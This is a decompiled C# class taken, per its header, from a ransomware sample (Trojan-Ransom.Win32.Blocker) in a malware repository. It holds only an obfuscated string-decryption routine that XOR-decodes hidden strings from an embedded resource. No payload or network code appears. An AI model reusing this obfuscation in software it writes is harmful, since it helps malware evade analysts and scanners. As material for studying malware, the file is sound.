// Decompiled with JetBrains decompiler
// Type: ?1?.?8?
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B16D8A9B-E0EE-4C85-A3BA-4405997EF24D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.bgfw-a4892676fe7d1d73d3b37d39e1a1e9d1be41dca8bcf297ce0ddfed35c970d2b7.exe

using \u003F1\u003F;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Text;

namespace \u003F1\u003F
{
  internal static class \u003F8\u003F
  {
    private static readonly object \u003F1\u003F = new object();
    private static Dictionary<int, string> \u003F1\u003F;

    internal static string \u003F1\u003F(int _param0, int _param1, int _param2)
    {
      lock (\u003F8\u003F.\u003F1\u003F)
      {
        int num1 = _param0 ^ 1529218394;
        if (\u003F8\u003F.\u003F1\u003F != null && \u003F8\u003F.\u003F1\u003F.ContainsKey(num1))
          return \u003F8\u003F.\u003F1\u003F[num1];
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        byte[] buffer1;
        using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(\u003F82\u003F.\u003F83\u003F("CĭȮ̮Ъԣٿݸ\u0879य\u0A77ଠఠ\u0D71\u0E76༥ၱᄺሾጹᐼᔻᘺ\u173Fᡮ\u193Eᨾ᭧ᰳᴵḺἹ")))
        {
          buffer1 = new byte[manifestResourceStream.Length];
          manifestResourceStream.Read(buffer1, 0, Convert.ToInt32(manifestResourceStream.Length));
        }
        int num2 = _param1;
        byte[] publicKeyToken = executingAssembly.GetName().GetPublicKeyToken();
        int num3;
        if (publicKeyToken != null && publicKeyToken.Length == 8)
        {
          int int32_1 = BitConverter.ToInt32(publicKeyToken, 0);
          int int32_2 = BitConverter.ToInt32(publicKeyToken, 4);
          num3 = num2 ^ int32_1 ^ int32_2;
        }
        else
          num3 = num2 ^ 1327699335;
        int length = _param2 ^ 1137833762;
        byte[] bytes = new byte[length];
        int num4 = 0;
        for (int index = num3; index < num3 + length; ++index)
          bytes[num4++] = buffer1[index];
        byte[] buffer2 = new byte[length];
        new Random(num1).NextBytes(buffer2);
        for (int index = 0; index < length; ++index)
          bytes[index] ^= buffer2[index];
        string str = Encoding.Unicode.GetString(bytes);
        if (\u003F8\u003F.\u003F1\u003F == null)
          \u003F8\u003F.\u003F1\u003F = new Dictionary<int, string>();
        \u003F8\u003F.\u003F1\u003F.Add(num1, str);
        return str;
      }
    }
  }
}
